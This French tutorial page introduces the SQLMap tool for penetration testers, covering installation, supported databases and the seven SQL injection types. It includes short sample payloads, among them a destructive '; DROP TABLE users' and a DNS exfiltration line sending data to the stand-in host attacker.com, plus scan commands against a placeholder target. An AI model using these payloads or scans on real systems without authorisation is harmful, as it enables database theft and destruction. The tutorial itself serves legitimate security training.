# Introduction a SQLMap

L'injection SQL reste l'une des vulnérabilités les plus répandues dans les applications web. Quand on tombe sur un paramètre potentiellement injectable en pentest, la question se pose vite : tester manuellement chaque variante d'injection, ou automatiser la détection et l'exploitation ? C'est exactement le rôle de SQLMap.

## Pourquoi

SQLMap est un outil open source écrit en Python, maintenu activement depuis 2006. Il automatise la détection et l'exploitation des failles d'injection SQL, de la simple confirmation d'un paramètre vulnérable jusqu'à l'extraction complète d'une base de données, voire l'exécution de commandes sur le système d'exploitation.

Ce qui le distingue des autres outils du même type, c'est l'étendue de sa couverture : il prend en charge tous les types connus d'injection SQL, supporte plus de 30 SGBD différents, et embarque un moteur de détection capable d'identifier des vulnérabilités que d'autres outils manqueraient.

{% hint style="info" %}
SQLMap ne remplace pas la compréhension de l'injection SQL. C'est un multiplicateur de force : il faut savoir ce qu'on cherche pour l'utiliser efficacement. Un scan lancé à l'aveugle sur une URL produit rarement des résultats exploitables.
{% endhint %}

Ses capacités couvrent un large spectre :

| Catégorie | Description |
|---|---|
| Connexion à la cible | Gestion des requêtes HTTP (GET, POST, cookies, headers, fichiers de requête) |
| Détection d'injection | Moteur heuristique + tests exhaustifs sur tous les types de SQLi |
| Fingerprinting | Identification précise du SGBD, de sa version et de sa configuration |
| Enumération | Extraction de bases, tables, colonnes, données, schémas complets |
| Optimisation | Threads, techniques sélectives, réduction du bruit |
| Contournement de protections | Scripts tamper, anti-CSRF, rotation de User-Agent, proxies |
| Accès au système de fichiers | Lecture et écriture de fichiers sur le serveur via SQLi |
| Exécution de commandes OS | Shell interactif via UDF ou web shell uploadé |

## Comment ça marche

### Installation

Sur Exegol (et la plupart des distributions orientées sécurité), SQLMap est déjà installé. Sinon, deux méthodes :

{% tabs %}
{% tab title="Via apt" %}
```bash
sudo apt install sqlmap
```
{% endtab %}
{% tab title="Via git (dernière version)" %}
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
La version git est souvent en avance sur celle des dépôts. En pentest, avoir la dernière version peut faire la différence sur certains contournements de WAF ou le support de SGBD récents.
{% endhint %}

### SGBD supportés

SQLMap possède la plus large couverture de SGBD parmi les outils d'exploitation SQL. Voici la liste complète :

| | | | |
|---|---|---|---|
| MySQL | Oracle | PostgreSQL | Microsoft SQL Server |
| SQLite | IBM DB2 | Microsoft Access | Firebird |
| Sybase | SAP MaxDB | Informix | MariaDB |
| HSQLDB | CockroachDB | TiDB | MemSQL |
| H2 | MonetDB | Apache Derby | Amazon Redshift |
| Vertica | Mckoi | Presto | Altibase |
| MimerSQL | CrateDB | Greenplum | Drizzle |
| Apache Ignite | Cubrid | InterSystems Cache | IRIS |
| eXtremeDB | FrontBase | | |

{% hint style="info" %}
En pratique, la grande majorité des cibles en pentest tournent sur MySQL/MariaDB, PostgreSQL ou Microsoft SQL Server. Mais la prise en charge de SGBD plus exotiques (CockroachDB, TiDB, Amazon Redshift) est précieuse quand on tombe sur des environnements cloud ou des architectures modernes.
{% endhint %}

### Types d'injection SQL supportés

SQLMap détecte et exploite les 7 types d'injection SQL connus. L'option `--technique` permet de sélectionner lesquels tester, avec par défaut la valeur `BEUSTQ` :

```bash
sqlmap -hh
# ...
# Techniques:
#   --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Chaque lettre correspond à un type d'injection :

#### Boolean-based blind (B)

L'injection aveugle basée sur les booléens fonctionne en comparant les réponses du serveur selon que la condition injectée est vraie ou fausse. SQLMap envoie des requêtes qui produisent un résultat `TRUE` ou `FALSE` et analyse les différences dans la réponse (contenu, code HTTP, titre de page, texte filtré).

```sql
AND 1=1
```

- Une réponse `TRUE` ressemble à la réponse normale du serveur (différence marginale ou nulle).
- Une réponse `FALSE` présente une différence significative par rapport à la réponse habituelle.

C'est le type d'injection le plus courant dans les applications web. L'extraction se fait octet par octet, ce qui le rend relativement lent mais très fiable.

#### Error-based (E)

L'injection basée sur les erreurs exploite les messages d'erreur du SGBD renvoyés dans la réponse HTTP. Des payloads spécifiques provoquent des erreurs contrôlées qui incluent le résultat de la requête injectée dans le message d'erreur.

```sql
AND GTID_SUBSET(@@version,0)
```

SQLMap embarque des payloads error-based pour les SGBD suivants :

| | | |
|---|---|---|
| MySQL | PostgreSQL | Oracle |
| Microsoft SQL Server | Sybase | Vertica |
| IBM DB2 | Firebird | MonetDB |

Ce type est plus rapide que les injections aveugles car il peut extraire des blocs de données (environ 200 octets) à chaque requête. Seule l'injection UNION est plus rapide.

#### UNION query-based (U)

L'injection UNION étend la requête originale avec un `UNION ALL SELECT` pour ajouter des résultats supplémentaires dans la réponse de la page.

```sql
UNION ALL SELECT 1,@@version,3
```

C'est le type le plus rapide : dans le scénario idéal, on peut extraire le contenu complet d'une table en une seule requête. La condition est que les résultats de la requête originale soient affichés dans la page.

#### Stacked queries (S)

Les requêtes empilées (aussi appelées "piggy-backing") consistent à injecter des instructions SQL supplémentaires après la requête vulnérable, séparées par un point-virgule.

```sql
; DROP TABLE users
```

Ce mécanisme permet d'exécuter des instructions non-SELECT (`INSERT`, `UPDATE`, `DELETE`), ce qui ouvre la porte à des modifications de données ou à l'exécution de commandes OS. Le support dépend du SGBD et de la couche d'accès : Microsoft SQL Server et PostgreSQL le prennent en charge nativement, MySQL via certaines API seulement.

{% hint style="warning" %}
Les stacked queries sont puissantes mais dangereuses. Un `DELETE` ou `DROP` mal contrôlé peut détruire des données en production. En pentest, on les utilise avec précaution et toujours avec l'accord du client.
{% endhint %}

#### Time-based blind (T)

Le principe est identique au boolean-based blind, mais au lieu de comparer le contenu des réponses, on mesure le temps de réponse du serveur. Une condition vraie déclenche un délai (via `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`, etc.), une condition fausse retourne immédiatement.

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

- Une réponse `TRUE` se traduit par un temps de réponse nettement plus long que la normale.
- Une réponse `FALSE` garde un temps de réponse standard.

Ce type est sensiblement plus lent que le boolean-based blind (chaque bit d'information coûte un délai d'attente). On l'utilise quand le boolean-based ne fonctionne pas, par exemple quand la requête vulnérable est un `INSERT` ou un `UPDATE` qui n'affecte pas le rendu de la page.

#### Inline queries (Q)

Les requêtes en ligne consistent à imbriquer une sous-requête directement dans la requête originale.

```sql
SELECT (SELECT @@version) FROM dual
```

Ce type d'injection est rare car il nécessite que l'application soit codée d'une manière spécifique qui permet l'imbrication. SQLMap le supporte néanmoins pour couvrir ces cas de figure.

#### Out-of-band (OOB)

L'injection hors bande est le type le plus avancé. Elle est utilisée quand tous les autres types échouent ou sont trop lents. SQLMap implémente cette technique via l'exfiltration DNS.

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Le principe : SQLMap tourne sur le serveur DNS d'un domaine sous contrôle (par exemple `.attacker.com`). Il force le serveur cible à résoudre des sous-domaines inexistants dont le nom contient les données exfiltrées (par exemple `5.7.38.attacker.com` pour la version MySQL). SQLMap capture ces requêtes DNS et reconstitue la réponse complète.

{% hint style="danger" %}
L'exfiltration DNS nécessite de contrôler un serveur DNS et de configurer les enregistrements NS. Ce n'est pas un type d'injection qu'on lance en quelques secondes. En pentest, on le garde pour les cas où les canaux classiques sont tous bloqués.
{% endhint %}

## En pratique

Un premier lancement de SQLMap ressemble à ceci :

```bash
sqlmap -u 'http://<IP_CIBLE>/page.php?id=5'
```

Le moteur de détection suit une séquence logique :

1. Vérifie la stabilité de la page cible (la réponse est-elle constante pour la même requête ?)
2. Teste si le paramètre est dynamique (la réponse change-t-elle quand on modifie la valeur ?)
3. Lance une analyse heuristique rapide pour estimer si le paramètre est injectable
4. Tente les techniques d'injection une par une (`BEUSTQ` par défaut)
5. Une fois une injection confirmée, identifie le SGBD et sa version

```bash
sqlmap -u 'http://<IP_CIBLE>/page.php?id=5'

# Exemple de sortie (résumé) :
# [INFO] testing connection to the target URL
# [INFO] target URL content is stable
# [INFO] testing if GET parameter 'id' is dynamic
# [INFO] GET parameter 'id' is dynamic
# [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
# [INFO] testing for SQL injection on GET parameter 'id'
# ...
```

{% hint style="success" %}
L'option `--batch` accepte automatiquement toutes les valeurs par défaut aux prompts de SQLMap. Pratique pour les scans non supervisés, mais attention : certains choix par défaut ne sont pas toujours optimaux.
{% endhint %}

## Pièges et galères

- **Scanner sans comprendre** : lancer SQLMap sur chaque URL sans avoir identifié manuellement les points d'injection potentiels génère du bruit et fait perdre du temps. Un minimum de reconnaissance manuelle avant l'automatisation est toujours plus efficace.
- **Faux négatifs** : par défaut, SQLMap teste avec `--level=1` et `--risk=1`, ce qui limite les payloads à 72 variantes. Un paramètre injectable peut passer inaperçu. Monter le level et le risk augmente la couverture mais aussi le temps de scan.
- **WAF non détecté** : si les résultats sont incohérents ou si SQLMap ne trouve rien sur un paramètre suspect, un WAF bloque peut-être les payloads. Les scripts tamper et les options de contournement sont traités dans une page dédiée.
- **Stacked queries en aveugle** : tester `; DROP TABLE` en production sans savoir si les stacked queries sont supportées peut causer des dégâts irréversibles. Toujours tester sur un environnement contrôlé d'abord.

## Retour terrain

En pentest, SQLMap intervient généralement après une phase de reconnaissance manuelle. On identifie un point d'injection probable (paramètre GET/POST, cookie, header), on confirme avec un test manuel rapide, puis on lance SQLMap pour automatiser l'exploitation.

L'outil excelle pour l'extraction massive de données et l'escalade (lecture de fichiers, exécution de commandes) une fois l'injection confirmée. Sur des cibles protégées par des WAF, la combinaison de scripts tamper et d'options de contournement permet souvent de passer là où un test manuel serait trop chronophage.

La vraie valeur ajoutée de SQLMap n'est pas la détection (un pentester expérimenté repère souvent les injections plus vite manuellement) mais l'exploitation systématique et approfondie une fois le point d'entrée identifié.

## Mémo express

| Élément | Détail |
|---|---|
| Outil | SQLMap (Python, open source, depuis 2006) |
| Installation | `apt install sqlmap` ou `git clone` |
| SGBD supportés | 33+ (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) |
| Types d'injection | B (boolean blind), E (error), U (UNION), S (stacked), T (time blind), Q (inline), OOB (DNS) |
| Le plus rapide | UNION query-based |
| Le plus courant | Boolean-based blind |
| Le plus avancé | Out-of-band (DNS exfiltration) |
| Option par défaut | `--technique=BEUSTQ` (teste tous les types) |
| Commande de base | `sqlmap -u 'http://<IP_CIBLE>/page.php?id=5'` |
| Mode automatique | Ajouter `--batch` pour accepter les valeurs par défaut |

***
